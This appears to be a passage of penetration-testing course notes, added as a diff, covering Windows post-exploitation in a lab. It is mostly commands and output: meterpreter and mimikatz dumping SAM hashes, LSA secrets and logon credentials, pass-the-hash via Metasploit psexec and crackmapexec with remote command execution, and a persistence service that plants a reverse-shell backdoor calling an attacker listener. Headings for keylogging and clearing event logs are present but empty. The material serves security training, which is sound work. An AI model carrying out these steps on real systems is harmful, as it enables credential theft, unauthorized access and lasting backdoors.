+  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1
+
+RID  : 000003f0 (1008)
+User : student
+  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b
+===============================================================================================================================
+===============================================================================================================================
+meterpreter > lsa_dump_secrets 
+[+] Running as SYSTEM
+[*] Dumping LSA secrets
+Domain : ATTACKDEFENSE
+SysKey : 377af0de68bdc918d22c57a263d38326
+
+Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
+Domain name : WORKGROUP
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {47980b9c-8bd1-89c9-bfb5-0c4fca25e625}
+  [00] {47980b9c-8bd1-89c9-bfb5-0c4fca25e625} 247e7be223db5e50291fc0fcec276ff8236c32a8a6183c5a0d0b6b044590ce06
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 34 5e 65 80 f9 04 a4 8c a5 0e 6c 74 6c d2 c3 b8 8e 7a ca c3 a3 3b 0e 6e 0a 64 f3 12 fc c7 92 67 a3 2f d5 d1 e4 41 33 ac 
+    full: 345e6580f904a48ca50e6c746cd2c3b88e7acac3a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
+    m/u : 345e6580f904a48ca50e6c746cd2c3b88e7acac3 / a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
+old/hex : 01 00 00 00 c1 3a 28 e3 94 7b 64 5d 94 29 b4 c9 1c 9b 0c b1 b6 5a aa 2c 34 4d ee ed 86 74 0f 12 25 37 8c 38 69 b3 b4 53 b6 37 86 44 
+    full: c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c344deeed86740f1225378c3869b3b453b6378644
+    m/u : c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c / 344deeed86740f1225378c3869b3b453b6378644
+
+Secret  : NL$KM
+cur/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 
+old/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 
+
+
+```
+
+
+
+
+
+**Dumping Hashes With with mimikatz**
+
+```bash
+meterpreter > cd C:\\
+meterpreter > mkdir Temp
+Creating directory: Temp
+meterpreter > cd Temp 
+meterpreter > pwd
+C:\Temp
+meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+[*] uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
+[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
+[*] uploaded   : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
+meterpreter > shell
+Process 1540 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.17763.1457]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Temp>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9E32-0E96
+
+ Directory of C:\Temp
+
+01/22/2024  07:00 PM    <DIR>          .
+01/22/2024  07:00 PM    <DIR>          ..
+01/22/2024  07:00 PM         1,309,448 mimikatz.exe
+               1 File(s)      1,309,448 bytes
+               2 Dir(s)  15,983,468,544 bytes free
+
+C:\Temp>.\mimikatz.exe
+.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+```
+
+`Privilege '20' OK` it means we have the appropriate  privilege to perform hash extraction from memory
+
+
+
+dump sam file
+
+```bash
+mimikatz # lsadump::sam
+Domain : ATTACKDEFENSE
+SysKey : 377af0de68bdc918d22c57a263d38326
+Local SID : S-1-5-21-3688751335-3073641799-161370460
+
+SAMKey : 858f5bda5c99e45094a6a1387241a33d
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : ed1f5e64aad3727f03522bbddc080d77
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : ATTACKDEFENSEAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : f566d48c0c62f88d997e9e56b52eed1696aead09df3100982bcfc5920655da5d
+      aes128_hmac       (4096) : bf0ca9e206e82ce481c818070bef0855
+      des_cbc_md5       (4096) : 6d570d08df8979fe
+    OldCredentials
+      aes256_hmac       (4096) : 69d101a02f3f4648bf9875f10c1cd268d3f500c3253ab862222a9e1bb3740247
+      aes128_hmac       (4096) : 3c3fd899f7f004ed44e9e48f868a5ddc
+      des_cbc_md5       (4096) : 9b808fb9e0cbb3b5
+    OlderCredentials
+      aes256_hmac       (4096) : 4cbbe8ad8482ca76952b08cd9103ba91af35c9d8b21a3d49c332e072618a9fa9
+      aes128_hmac       (4096) : b18addd75f8a2b106b262c7b5e517623
+      des_cbc_md5       (4096) : 7fe0c2a15eb32fcd
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : ATTACKDEFENSEAdministrator
+    Credentials
+      des_cbc_md5       : 6d570d08df8979fe
+    OldCredentials
+      des_cbc_md5       : 9b808fb9e0cbb3b5
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : a1528cd40d99e5dfa9fa0809af998696
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
+      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
+      des_cbc_md5       (4096) : ce9b2cabd55df4ce
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : ce9b2cabd55df4ce
+
+
+RID  : 000003f0 (1008)
+User : student
+  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : b8e5edf45f3a42335f1f4906a24a08fe
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EC2AMAZ-R69684Tstudent
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : bab064fdaf62216a1577f1d5cd88e162f6962b4a421d199adf4c66b61ec6ac7c
+      aes128_hmac       (4096) : 42bc1d17d1236d3afc09efbeba547d2c
+      des_cbc_md5       (4096) : 1a975b02a7bf15d5
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : EC2AMAZ-R69684Tstudent
+    Credentials
+      des_cbc_md5       : 1a975b02a7bf15d5
+
+
+
+```
+
+
+
+**dump lsa secrets with mimikatz**
+
+```bash
+mimikatz # lsadump::secrets
+Domain : ATTACKDEFENSE
+SysKey : 377af0de68bdc918d22c57a263d38326
+
+Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
+Domain name : WORKGROUP
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {47980b9c-8bd1-89c9-bfb5-0c4fca25e625}
+  [00] {47980b9c-8bd1-89c9-bfb5-0c4fca25e625} 247e7be223db5e50291fc0fcec276ff8236c32a8a6183c5a0d0b6b044590ce06
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 34 5e 65 80 f9 04 a4 8c a5 0e 6c 74 6c d2 c3 b8 8e 7a ca c3 a3 3b 0e 6e 0a 64 f3 12 fc c7 92 67 a3 2f d5 d1 e4 41 33 ac 
+    full: 345e6580f904a48ca50e6c746cd2c3b88e7acac3a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
+    m/u : 345e6580f904a48ca50e6c746cd2c3b88e7acac3 / a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
+old/hex : 01 00 00 00 c1 3a 28 e3 94 7b 64 5d 94 29 b4 c9 1c 9b 0c b1 b6 5a aa 2c 34 4d ee ed 86 74 0f 12 25 37 8c 38 69 b3 b4 53 b6 37 86 44 
+    full: c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c344deeed86740f1225378c3869b3b453b6378644
+    m/u : c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c / 344deeed86740f1225378c3869b3b453b6378644
+
+Secret  : NL$KM
+cur/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 
+old/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 
+
+
+```
+
+
+
+
+
+**display logon passwords**
+
+if the system is configured to store logon password in memory in cleartext, mimikatz can extract them
+
+```bash
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 2422124 (00000000:0024f56c)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:33:00 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ATTACKDEFENSE$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2422015 (00000000:0024f4ff)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:33:00 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ATTACKDEFENSE$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2411085 (00000000:0024ca4d)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:32:59 PM
+SID               : S-1-5-96-0-3
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ATTACKDEFENSE$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 58742 (00000000:0000e576)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:30:45 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ATTACKDEFENSE$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : ATTACKDEFENSE$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:30:44 PM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ATTACKDEFENSE$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : attackdefense$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 28279 (00000000:00006e77)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:30:43 PM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 150552 (00000000:00024c18)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : ATTACKDEFENSE
+Logon Server      : ATTACKDEFENSE
+Logon Time        : 1/22/2024 6:30:53 PM
+SID               : S-1-5-21-3688751335-3073641799-161370460-500
+	msv :	
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : ATTACKDEFENSE
+	 * NTLM     : e3c61a68f1b89ee6c8ba9507378dc88d
+	 * SHA1     : fa62275e30d286c09d30d8fece82664eb34323ef
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : ATTACKDEFENSE
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : ATTACKDEFENSE
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:30:45 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 58761 (00000000:0000e589)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:30:45 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ATTACKDEFENSE$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 29374 (00000000:000072be)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:30:44 PM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ATTACKDEFENSE$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 29346 (00000000:000072a2)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:30:44 PM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ATTACKDEFENSE$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : ATTACKDEFENSE$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 1/22/2024 6:30:43 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ATTACKDEFENSE$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : attackdefense$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+
+```
+
+the server is configured well and not display any cleartext password 
+
+
+
+---
+
+#### Pass-the-Hash With PSExec    
+
+Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
+
+This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.
+
+
+
+**1- perform Pass-The-Hash attack with psexec metasploit module**
+
+we need LM hash and NTLM hash also
+
+```bash
+meterpreter > hashdump 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+
+
+user:SID:LMhash:NTLMhash
+```
+
+
+
+use the LM hash and NTLM hash as a password
+
+```cmd
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > 
+Background session 1? [y/N]  
+msf6 exploit(windows/http/badblue_passthru) > search psexec
+
+msf6 > use exploit(windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > setg RHOSTS 10.4.27.152
+RHOSTS => 10.4.27.152
+msf6 exploit(windows/smb/psexec) > set LPORT 4222
+LPORT => 4222
+msf6 exploit(windows/smb/psexec) > set SMBUSER Administrator
+SMBUSER => Administrator
+msf6 exploit(windows/smb/psexec) > set SMBPASS aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
+SMBPASS => aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
+msf6 exploit(windows/smb/psexec) > show targets 
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic
+   1   PowerShell
+   2   Native upload
+   3   MOF upload
+   4   Command
+
+
+msf6 exploit(windows/smb/psexec) > set target Native\ upload 
+target => Native upload
+msf6 exploit(windows/smb/psexec) > exploit 
+
+[*] Started reverse TCP handler on 10.10.23.5:4222 
+[*] 10.4.27.152:445 - Connecting to the server...
+[*] 10.4.27.152:445 - Authenticating to 10.4.27.152:445 as user 'Administrator'...
+[!] 10.4.27.152:445 - peer_native_os is only available with SMB1 (current version: SMB3)
+[*] 10.4.27.152:445 - Uploading payload... kCirjrlU.exe
+[*] 10.4.27.152:445 - Created \kCirjrlU.exe...
+[+] 10.4.27.152:445 - Service started successfully...
+[*] Sending stage (175174 bytes) to 10.4.27.152
+[*] 10.4.27.152:445 - Deleting \kCirjrlU.exe...
+[*] Meterpreter session 3 opened (10.10.23.5:4222 -> 10.4.27.152:50396) at 2024-01-26 19:00:32 +0530
+
+meterpreter > 
+
+```
+
+
+
+**2- perform Pass-The-Hash attack with crackmapexec**
+
+we need the user and his NTLM hash
+
+```bash
+ root@attackdefense:~# crackmapexec smb 10.4.27.152 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" 
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing LDAP protocol database
+[*] Initializing SMB protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing SSH protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB  10.4.27.152     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
+SMB  10.4.27.152     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!) <<<====
+
+
+root@attackdefense:~# crackmapexec smb 10.4.27.152 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "ipconfig"
+SMB         10.4.27.152     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
+SMB         10.4.27.152     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
+SMB         10.4.27.152     445    ATTACKDEFENSE    [+] Executed command 
+SMB         10.4.27.152     445    ATTACKDEFENSE    Windows IP Configuration
+SMB         10.4.27.152     445    ATTACKDEFENSE    
+SMB         10.4.27.152     445    ATTACKDEFENSE    
+SMB         10.4.27.152     445    ATTACKDEFENSE    Ethernet adapter Ethernet 3:
+SMB         10.4.27.152     445    ATTACKDEFENSE    
+SMB         10.4.27.152     445    ATTACKDEFENSE    Connection-specific DNS Suffix  . : ec2.internal
+SMB         10.4.27.152     445    ATTACKDEFENSE    Link-local IPv6 Address . . . . . : fe80::a4c2:575f:50d4:9a4b%8
+SMB         10.4.27.152     445    ATTACKDEFENSE    IPv4 Address. . . . . . . . . . . : 10.4.27.152
+SMB         10.4.27.152     445    ATTACKDEFENSE    Subnet Mask . . . . . . . . . . . : 255.255.240.0
+SMB         10.4.27.152     445    ATTACKDEFENSE    Default Gateway . . . . . . . . . : 10.4.16.1
+
+```
+
+
+
+
+
+---
+
+#### Establishing Persistence On Windows     
+
++ Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.
++ Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.
++ We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.
+
+
+
+**Persistence  `exploit/windows/local/persistence_service`**
+
+This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.
+
+```bash
+meterpreter > sysinfo 
+Computer        : WIN-OMCNBKR66MN
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > pgrep lsass
+512
+meterpreter > getuid 
+Server username: WIN-OMCNBKR66MN\Administrator
+meterpreter > 
+meterpreter > 
+Background session 1? [y/N]  
+
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/persistence_service
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/persistence_service) > options 
+
+Module options (exploit/windows/local/persistence_service):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   REMOTE_EXE_NAME                       no        The remote victim name. Random string as default.
+   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp directory as default.
+   RETRY_TIME           5                no        The retry time that shell connect failed. 5 seconds as default.
+   SERVICE_DESCRIPTION                   no        The description of service. Random string as default.
+   SERVICE_NAME                          no        The name of service. Random string as default.
+   SESSION                               yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.22.8       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+
+
+msf6 exploit(windows/local/persistence_service) > set SESSION 1
+SESSION => 1
+msf6 exploit(windows/local/persistence_service) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                      Connection
+  --  ----  ----                     -----------                                      ----------
+  1         meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.22.8:4444 -> 10.4.30.21:49245 (10.4.30.21)
+
+msf6 exploit(windows/local/persistence_service) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/persistence_service) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/persistence_service) > run
+
+[*] Started reverse TCP handler on 10.10.22.8:4444 
+[*] Running module against WIN-OMCNBKR66MN
+[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\1\Jswg.exe
+[*] Creating service oEqXS
+[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WIN-OMCNBKR66MN_20240204.0759/WIN-OMCNBKR66MN_20240204.0759.rc
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/local/persistence_service) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > sysinfo
+Computer        : WIN-OMCNBKR66MN
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > getuid 
+Server username: WIN-OMCNBKR66MN\Administrator
+meterpreter > pgrep lsass
+512
+meterpreter > migrate 512
+[*] Migrating from 1280 to 512...
+[*] Migration completed successfully.
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > sysinfo 
+Computer        : WIN-OMCNBKR66MN
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+meterpreter > 
+Background session 1? [y/N]  
+msf6 exploit(windows/local/persistence_service) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-OMCNBKR66MN  10.10.22.8:4444 -> 10.4.30.21:49245 (10.4.30.21)
+
+msf6 exploit(windows/local/persistence_service) > options 
+
+Module options (exploit/windows/local/persistence_service):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   REMOTE_EXE_NAME                       no        The remote victim name. Random string as default.
+   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp directory as default.
+   RETRY_TIME           5                no        The retry time that shell connect failed. 5 seconds as default.
+   SERVICE_DESCRIPTION                   no        The description of service. Random string as default.
+   SERVICE_NAME                          no        The name of service. Random string as default.
+   SESSION              1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.22.8       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+
+
+msf6 exploit(windows/local/persistence_service) > run
+
+[*] Started reverse TCP handler on 10.10.22.8:4444 
+[*] Running module against WIN-OMCNBKR66MN
+[*] Sending stage (175174 bytes) to 10.4.30.21
+[+] Meterpreter service exe written to C:\Windows\TEMP\ZLWfx.exe
+[*] Creating service kewC
+[*] Meterpreter session 2 opened (10.10.22.8:4444 -> 10.4.30.21:49295) at 2024-02-04 00:09:52 +0530
+[*] Sending stage (175174 bytes) to 10.4.30.21
+[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WIN-OMCNBKR66MN_20240204.0952/WIN-OMCNBKR66MN_20240204.0952.rc
+
+meterpreter > pwd
+C:\Windows\system32
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+
+```
+
+
+
+
+
+**kill all sessions and setup the listener to open new meterpreter session automatically**
+
+```bash
+Background session 2? [y/N]  
+msf6 exploit(windows/local/persistence_service) > 
+msf6 exploit(windows/local/persistence_service) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-OMCNBKR66MN  10.10.22.8:4444 -> 10.4.30.21:49245 (10.4.30.21)
+  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-OMCNBKR66MN  10.10.22.8:4444 -> 10.4.30.21:49295 (10.4.30.21)
+
+msf6 exploit(windows/local/persistence_service) > sessions -K
+[*] Killing all sessions...
+[*] 10.4.30.21 - Meterpreter session 1 closed.
+[*] 10.4.30.21 - Meterpreter session 2 closed.
+msf6 exploit(windows/local/persistence_service) > use multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set LHOST eth1
+LHOST => 10.10.22.8
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.22.8:4444 
+[*] Sending stage (175174 bytes) to 10.4.30.21
+[*] Meterpreter session 3 opened (10.10.22.8:4444 -> 10.4.30.21:49339) at 2024-02-04 00:16:58 +0530
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+```
+
+We have received a new meterpreter session with the highest privileged.
+
+
+
+**every time a connection is close, we can get a new session  **
+
+Also, the backdoor is running as a service. Even if the session gets killed we would again gain it by re-running the Metasploit multi-handler. In this case, we exit the session and run the handler to gain the session again.
+
+```bash
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
+[*] 10.4.30.21 - Meterpreter session 3 closed.  Reason: User exit
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.22.8:4444 
+[*] Sending stage (175174 bytes) to 10.4.30.21
+[*] Meterpreter session 4 opened (10.10.22.8:4444 -> 10.4.30.21:49349) at 2024-02-04 00:19:06 +0530
+
+meterpreter > 
+
+```
+
+
+
+
+
+---
+
+#### Enabling RDP    
+
+
+
+
+
+
+
+
+
+
+
+#### Windows Keylogging    
+
+#### Clearing Windows Event Logs    
+
+#### Pivoting   
